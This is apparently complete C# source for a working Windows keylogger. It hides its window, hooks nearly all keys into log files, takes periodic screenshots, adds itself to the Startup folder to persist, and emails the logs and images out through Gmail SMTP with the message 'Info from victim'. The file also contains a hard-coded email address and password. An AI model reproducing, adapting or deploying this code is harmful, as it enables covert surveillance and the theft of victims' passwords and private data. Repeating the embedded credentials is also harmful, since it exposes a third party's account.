using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Linq;
using System.Net.Mail;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace KL
{

    public partial class Form1 : Form
    {
        StringBuilder keybuffer = new StringBuilder(); 
        globalKeyboardHook gkh = new globalKeyboardHook();
        static int i = 0, j=0;
        public Form1()
        {
            InitializeComponent();            
            StartUp();
            timer1.Start();
         timer3.Start();
        }
        private void Form1_Shown(object sender, EventArgs e)
        {
            this.Hide();
        }
        private void Form1_Load(object sender, EventArgs e)
        {
            this.Hide();
            gkh.HookedKeys.Add(Keys.A);
            gkh.HookedKeys.Add(Keys.B);
            gkh.HookedKeys.Add(Keys.Q);
            gkh.HookedKeys.Add(Keys.W);
            gkh.HookedKeys.Add(Keys.E);
            gkh.HookedKeys.Add(Keys.R);
            gkh.HookedKeys.Add(Keys.T);
            gkh.HookedKeys.Add(Keys.Y);
            gkh.HookedKeys.Add(Keys.U);
            gkh.HookedKeys.Add(Keys.I);
            gkh.HookedKeys.Add(Keys.O);
            gkh.HookedKeys.Add(Keys.P);
            gkh.HookedKeys.Add(Keys.S);
            gkh.HookedKeys.Add(Keys.D);
            gkh.HookedKeys.Add(Keys.F);
            gkh.HookedKeys.Add(Keys.G);
            gkh.HookedKeys.Add(Keys.H);
            gkh.HookedKeys.Add(Keys.J);
            gkh.HookedKeys.Add(Keys.K);
            gkh.HookedKeys.Add(Keys.L);
            gkh.HookedKeys.Add(Keys.Z);
            gkh.HookedKeys.Add(Keys.X);
            gkh.HookedKeys.Add(Keys.C);
            gkh.HookedKeys.Add(Keys.V);
            gkh.HookedKeys.Add(Keys.N);
            gkh.HookedKeys.Add(Keys.M);
            gkh.HookedKeys.Add(Keys.F1);
            gkh.HookedKeys.Add(Keys.F2);
            gkh.HookedKeys.Add(Keys.F3);
            gkh.HookedKeys.Add(Keys.F4);
            gkh.HookedKeys.Add(Keys.F5);
            gkh.HookedKeys.Add(Keys.F6);
            gkh.HookedKeys.Add(Keys.F7);
            gkh.HookedKeys.Add(Keys.F8);
            gkh.HookedKeys.Add(Keys.F9);
            gkh.HookedKeys.Add(Keys.F10);
            gkh.HookedKeys.Add(Keys.F11);
            gkh.HookedKeys.Add(Keys.F12);
            gkh.HookedKeys.Add(Keys.NumLock);
            gkh.HookedKeys.Add(Keys.NumPad0);
            gkh.HookedKeys.Add(Keys.NumPad1);
            gkh.HookedKeys.Add(Keys.NumPad2);
            gkh.HookedKeys.Add(Keys.NumPad3);
            gkh.HookedKeys.Add(Keys.NumPad4);
            gkh.HookedKeys.Add(Keys.NumPad5);
            gkh.HookedKeys.Add(Keys.NumPad7);
            gkh.HookedKeys.Add(Keys.NumPad6);
            gkh.HookedKeys.Add(Keys.NumPad8);
            gkh.HookedKeys.Add(Keys.NumPad9);
            gkh.HookedKeys.Add(Keys.D0);
            gkh.HookedKeys.Add(Keys.D1);
            gkh.HookedKeys.Add(Keys.D2);
            gkh.HookedKeys.Add(Keys.D3);
            gkh.HookedKeys.Add(Keys.D4);
            gkh.HookedKeys.Add(Keys.D5);
            gkh.HookedKeys.Add(Keys.D6);
            gkh.HookedKeys.Add(Keys.D7);
            gkh.HookedKeys.Add(Keys.D8);
            gkh.HookedKeys.Add(Keys.D9);
            gkh.HookedKeys.Add(Keys.Oemcomma);
            gkh.HookedKeys.Add(Keys.OemMinus);
            gkh.HookedKeys.Add(Keys.OemOpenBrackets);
            gkh.HookedKeys.Add(Keys.OemCloseBrackets);
            gkh.HookedKeys.Add(Keys.OemPeriod);
            gkh.HookedKeys.Add(Keys.Oemplus);
            gkh.HookedKeys.Add(Keys.OemQuestion);
            gkh.HookedKeys.Add(Keys.OemQuotes);
            gkh.HookedKeys.Add(Keys.PrintScreen);
            gkh.HookedKeys.Add(Keys.Tab);
            gkh.HookedKeys.Add(Keys.CapsLock);
            gkh.HookedKeys.Add(Keys.LControlKey);
            gkh.HookedKeys.Add(Keys.RControlKey);
            gkh.HookedKeys.Add(Keys.LShiftKey);
            gkh.HookedKeys.Add(Keys.RShiftKey);
            gkh.HookedKeys.Add(Keys.Home);
            gkh.HookedKeys.Add(Keys.Alt);
            gkh.HookedKeys.Add(Keys.Space);
            //gkh.HookedKeys.Add(Keys.Down);
            //gkh.HookedKeys.Add(Keys.Up);
            //gkh.HookedKeys.Add(Keys.Left);
            //gkh.HookedKeys.Add(Keys.Right);
            gkh.HookedKeys.Add(Keys.Delete);
            gkh.HookedKeys.Add(Keys.Enter);
            gkh.HookedKeys.Add(Keys.PageDown);
            gkh.HookedKeys.Add(Keys.PageUp);
            gkh.HookedKeys.Add(Keys.End);
            gkh.HookedKeys.Add(Keys.Divide);
            gkh.HookedKeys.Add(Keys.Back);
            gkh.HookedKeys.Add(Keys.Insert);
            gkh.HookedKeys.Add(Keys.OemSemicolon);

            gkh.KeyDown += new KeyEventHandler(gkh_KeyDown);
            //gkh.KeyUp += new KeyEventHandler(gkh_KeyUp);
        }

        //void gkh_KeyUp(object sender, KeyEventArgs e)
        //{
        //    lstLog.Items.Add("Up\t" + e.KeyCode.ToString());
        //    e.Handled = true;
        //}

        void gkh_KeyDown(object sender, KeyEventArgs e)
        {
            string content = e.KeyCode.ToString();
            if (content == "NumPad0" || content == "D0") content = "0";
            if (content == "NumPad1" || content == "D1") content = "1";
            if (content == "NumPad2" || content == "D2") content = "2";
            if (content == "NumPad3" || content == "D3") content = "3";
            if (content == "NumPad4" || content == "D4") content = "4";
            if (content == "NumPad5" || content == "D5") content = "5";
            if (content == "NumPad6" || content == "D6") content = "6";
            if (content == "NumPad7" || content == "D7") content = "7";
            if (content == "NumPad8" || content == "D8") content = "8";
            if (content == "NumPad9" || content == "D9") content = "9";
            if (content == "Space") content = " ";
            if (content == "Tab") content = "   ";
            if (content == "Return") content = "<Enter>";
            if (content == "LShiftKey" || content == "RShiftKey") content = "<Shift>";
            if (content == "RControlKey" || content == "LControlKey") content = "<Control>";
            if (content == "OemQuestion") content = "?";
            if (content == "Oemcomma") content = ",";
            if (content == "Oemplus") content = "+";
            if (content == "OemMinus") content = "-";
            if (content == "Oem1") content = ";";
            if (content == "OemOpenBrackets") content = "[";
            if (content == "Oem6") content = "]";
            if (content == "OemPeriod") content = ".";
            if (content == "Oem7") content = "'";
            if (content == "Divide") content = "/";
            if (content == "Delete" || content == "Back") content = "<Delete>";
            lstLog.Items.Add(content);
            keybuffer.Append(content);
            string logNameToWrite = "Result" + i.ToString() + ".txt";
            StreamWriter sw = new StreamWriter(logNameToWrite, true);
            sw.Write(keybuffer.ToString());
            keybuffer.Clear();
            sw.Close();
            //File.AppendAllText(path, content);
        }
        #region Capture
        static string imagePath = "Image_";
        static string imageExtendtion = ".png";
        static int imageCount = 0;

        /// <summary>
        /// Capture al screen then save into ImagePath
        /// </summary>
        static void CaptureScreen()
        {
            //Create a new bitmap.
            var bmpScreenshot = new Bitmap(Screen.PrimaryScreen.Bounds.Width,
                                           Screen.PrimaryScreen.Bounds.Height,
                                           PixelFormat.Format32bppArgb);

            // Create a graphics object from the bitmap.
            var gfxScreenshot = Graphics.FromImage(bmpScreenshot);

            // Take the screenshot from the upper left corner to the right bottom corner.
            gfxScreenshot.CopyFromScreen(Screen.PrimaryScreen.Bounds.X,
                                        Screen.PrimaryScreen.Bounds.Y,
                                        0,
                                        0,
                                        Screen.PrimaryScreen.Bounds.Size,
                                        CopyPixelOperation.SourceCopy);

            string directoryImage = imagePath + DateTime.Now.ToLongDateString() + i.ToString();

            if (!Directory.Exists(directoryImage))
            {
                Directory.CreateDirectory(directoryImage);
            }
            // Save the screenshot to the specified path that the user has chosen.
            string imageName = string.Format("{0}\\{1}{2}", directoryImage, DateTime.Now.ToLongDateString() + imageCount, imageExtendtion);

            try
            {
                bmpScreenshot.Save(imageName, ImageFormat.Png);
            }
            catch
            {

            }
            imageCount++;
        }
        #endregion  
        
        #region Mail
        static void SendMail()
        {
            try
            {
                MailMessage mail = new MailMessage();
                SmtpClient SmtpServer = new SmtpClient("smtp.gmail.com");

                mail.From = new MailAddress("quanglinh220401@gmail.com");
                mail.To.Add("quanglinh220401@gmail.com");
                mail.Subject = "Keylogger date: " + DateTime.Now.ToLongDateString();
                mail.Body = "Info from victim\n";

                string logFile = "result" + j.ToString() + ".txt";

                if (File.Exists(logFile))
                {
                    StreamReader sr = new StreamReader(logFile);

                    mail.Body += sr.ReadToEnd();

                    sr.Close();
                }

                string directoryImage = imagePath + DateTime.Now.ToLongDateString() + j.ToString();
                DirectoryInfo image = new DirectoryInfo(directoryImage);

                foreach (FileInfo item in image.GetFiles("*.png"))
                {
                    if (File.Exists(directoryImage + "\\" + item.Name))
                        mail.Attachments.Add(new Attachment(directoryImage + "\\" + item.Name));
                }

                SmtpServer.Port = 587;
                SmtpServer.Credentials = new System.Net.NetworkCredential("quanglinh220401@gmail.com", "dangbichtrinh");
                SmtpServer.EnableSsl = true;

                SmtpServer.Send(mail);
                Console.WriteLine("Send mail!");
                // https://www.google.com/settings/u/1/security/lesssecureapps
            }
            catch (Exception ex)
            {
                Console.WriteLine(ex.ToString());
            }
        }
        #endregion

        //create shortcut to file in startup
        private void StartUp() {
            //create shortcut to file in startup
            IWshRuntimeLibrary.WshShell wsh = new IWshRuntimeLibrary.WshShell();
            IWshRuntimeLibrary.IWshShortcut shortcut = wsh.CreateShortcut(
                Environment.GetFolderPath(Environment.SpecialFolder.Startup) + @"\KL.lnk") as IWshRuntimeLibrary.IWshShortcut;
            shortcut.Arguments = "";
            shortcut.TargetPath = Environment.CurrentDirectory + @"\KL.exe";
            shortcut.WindowStyle = 1;
            shortcut.Description = "KL";
            shortcut.WorkingDirectory = Environment.CurrentDirectory + @"\";
            //shortcut.IconLocation = "specify icon location";
            shortcut.Save();
        }
        int mailTime = 0;
        private void StartTimmer(object sender, EventArgs e)
        {
            Thread thread = new Thread(() =>
            {
                if (mailTime % 10 == 0) CaptureScreen();
                if (mailTime == 60)
                {
                    //SendMail();
                    i++;
                    mailTime = 0;
                }
                mailTime++;
            });
            thread.IsBackground = true;
            thread.Start();
        }

        private void SendMail(object sender, EventArgs e)
        {
            Thread thr = new Thread(() =>
            {
                SendMail();
                j++;
            });
            thr.IsBackground = true;
            thr.Start();
        }
    }
}
